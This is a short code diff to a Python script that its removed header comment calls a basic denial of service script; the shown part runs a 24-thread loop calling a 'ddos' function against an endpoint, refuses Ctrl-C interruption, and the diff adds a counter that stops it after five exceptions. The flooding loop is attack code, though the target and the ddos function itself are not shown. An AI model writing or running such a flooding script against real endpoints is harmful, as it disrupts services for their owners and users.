@@ -1,6 +1,3 @@
-# An extremely basic denial of service script that wont work on anyone who knows what a firewall is
-
-
 input("this one might be worse than the other script, press ctrl C now before its too late")
 
 
@@ -21,9 +18,14 @@ while 1:
     try:
         with ThreadPoolExecutor(max_workers=24) as executor:
             executor.map(ddos, [endpoint], [data])
+        exceptions = 0
     except KeyboardInterrupt:
         print("no")
         continue
     except Exception as e:
+        exceptions+=1
         print(f'Error: {e}')
         continue
+    if exceptions >= 5:
+        break
+print("Too many exceptions")
